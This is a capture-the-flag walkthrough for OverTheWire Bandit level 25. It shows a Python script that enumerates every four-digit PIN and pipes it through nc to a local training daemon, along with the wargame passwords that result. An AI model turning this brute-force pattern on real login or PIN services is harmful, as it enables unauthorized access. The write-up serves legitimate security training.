# Bandit 25

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

**Solution**

*Terminal*
```
bandit24@melinda:~$ mkdir /tmp/evanyeyeye_bandit25
bandit24@melinda:~$ cd /tmp/evanyeyeye_bandit25
bandit24@melinda:/tmp/evanyeyeye_bandit24$ nano program.py
```

*GNU nano editor*
```
for i in range(0,10000):
        i = str(i)
        if len(i) == 1:
                i = "000" + i
        elif len(i) == 2:
                i = "00" + i
        elif len(i) == 3:
                i = "0" + i
        print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + i)
```

*Terminal*
```
bandit24@melinda:/tmp/evanyeyeye_bandit25$ python program.py | nc localhost 30002 | uniq
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

Password is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

*All descriptions are borrowed from OverTheWire.*
